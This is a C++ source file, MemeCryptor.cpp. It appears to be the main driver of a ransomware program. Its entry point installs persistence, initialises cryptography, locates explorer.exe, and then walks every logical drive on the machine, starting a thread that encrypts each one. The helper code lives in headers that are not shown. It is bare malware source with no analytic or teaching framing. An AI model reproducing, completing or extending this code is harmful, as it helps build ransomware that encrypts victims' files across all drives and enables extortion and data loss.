// MemeCryptor.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

using namespace std;
#include "Persistent.h"
#include "Crypto.h"
#include <iostream>
#include "Threading.h"
#include "File.h"

int beginEncrypt() {
	DWORD driveStrSize = GetLogicalDriveStringsA(0, 0);
	LPSTR driveBuffer = (LPSTR)calloc(driveStrSize + 2, 1);
	if (!driveBuffer) {
		return -1;
	}

	GetLogicalDriveStringsA(driveStrSize, driveBuffer);

	for (int i = 0; i < driveStrSize - 1; i += strlen(driveBuffer) + 1) {
		launchThreadEncrypt(driveBuffer + i);
	}
	free(driveBuffer);
	return 0;
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
	if (mainPersist() == -1) {
		return -1;
	}
	if (cryptInit() == -1) {
		return -1;
	}
	findExplorerExe();
	if (initThreadStruct() == -1) {
		cryptCleanUp();
		cleanExplorerLL();
		return -1;
	}
	beginEncrypt();
	cleanUpThread();
	cryptCleanUp();
	cleanExplorerLL();
	persistCleanUp();


	return 0;

}
